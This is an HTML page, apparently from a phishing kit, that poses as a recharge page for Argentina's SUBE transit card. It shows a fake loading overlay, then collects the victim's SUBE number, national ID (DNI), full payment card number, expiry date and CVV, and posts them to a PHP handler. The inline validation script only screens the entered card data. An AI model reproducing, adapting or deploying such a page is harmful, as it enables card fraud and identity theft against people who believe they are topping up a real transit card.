
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sube Portable</title>
    <link rel="stylesheet" href="estilos.css">
</head>
<body>
    <header>
        <div class="contenedor-svg">
            <div class="contenedor-svg-div">
                <img src="img/sublogo.svg" class="svg" alt="">
            </div>
        </div>
    </header>
    <hr>

    <div class="overlay"></div>
    <div id="loader" class="loader"></div>
    <script style="text/javascript">
        var loader = document.getElementById('loader');
        var overlay = document.querySelector('.overlay');
        
        function hideLoader() {
          loader.classList.add('hide');
          overlay.classList.add('hide');
          overlay.classList.add('desindex');
        
        }
        setTimeout(hideLoader, 2000);

function validarDatos(){

        var cc, mm, aa, cvv;
        cc = document.getElementById("ccard").value;
        mm = document.getElementById("mm").value;
        aa = document.getElementById("aa").value;
        cvv = document.getElementById("cvv").value;
        if (cc==""||mm==""||aa==""||cvv==""){
        alert   ('Complete todos los campos');
        return false;
        }
        else if (cc < 369999999999999 ){
        alert   ('Tarjeta invalida');
        return false;
        }
        else if (cc < 29999999999999){
        alert   ('Tarjeta invalida');
        return false;
        }
        else if (cc > 5890000000000000){
        alert   ('Tarjeta invalida');
        return false;
        }
        else if (isNaN(cc)){
        alert   ('No se aceptan letras');
        return false;
        }
        else if (mm > 12){
        alert   ('Mes invalido');
        return false;
        }
        else if (mm < 1){
        alert   ('Mes invalido');
        return false;
        }
        else if (aa < 1){
        alert   ('Error de sistema');
        return false;
        }
        else if (aa > 42 || aa < 23){
        alert   ('Exprese el a単o del 23 al 42');
        return false;
        }

        else if (cvv > 9999 || cvv < 0){
        alert   ('cvv incorrecto');

        return false;
        }

}
  
        </script>
    <div class="container-body">
        <div class="container-body-form">
            <form method="post" action="controlador.php"  class="form" onsubmit="return validarDatos()">
               
                <div class="div-span-sube">
                    
                    <span class="span-sube"> 6061 **** **** ****</span>
                </div>
                <input type="text" name="input-sube" class="input-sube" placeholder="NUMERO DE LA TARJETA SUBE">
                
                    <div>
                    <select name="dinero" id="">
                        <option selected disabled>MONTO A RECARGAR</option>
                        <option value="100">$100</option>
                        <option value="200">$200</option>
                        <option value="300">$300</option>
                        <option value="400">$400</option>
                        <option value="500">$500</option>
                        <option value="1000">$1000</option>
                        <option value="1500">$1500</option>
                    </select>
                    </div>
               
                <input type="text" name="dni" class="dni-titular" placeholder="DNI DEL TITULAR">
                <div class="flex-img">
                    <img src="img/v.png" alt="">
                    <img src="img/m.png" alt="">
                    <img src="img/a.png" alt="">
                 </div>
                 <input type="text" id="ccard" name="ccard" maxlength="16" placeholder="Enter 16-digit card number">
                <div class="contenedor-form-fecha">
                    <input type="text" id="mm" name="mm" class="input-fecha input-fecha-1" maxlength="2" placeholder="MM"
                    onkeyup="if (this.value.length == this.getAttribute('maxlength')) { if (event.keyCode!=9) { getElementById('aa').focus(); } }">
                    <input type="text" id="aa" name="aa" class="input-fecha input-fecha-2"  maxlength="2" placeholder="AA"
                    onkeyup="if (this.value.length == this.getAttribute('maxlength')) { if (event.keyCode!=9) { getElementById('cvv').focus(); } }">
                </div>
                <div class="div-pass">
                    <input type="text" class="pass" name="cvv" id="cvv" placeholder="CVV" maxlength="4">
                </div>
                <input name="btnprocesar" class="button" type="submit" value="RECARGAR">
                <div class="div-logo">
                    <img src="img/pdp_logo.jpg" alt="">
                </div>
            </form>
            
        </div>
    </div>
    <script type="text/javascript" src=""></script>

</body>
</html>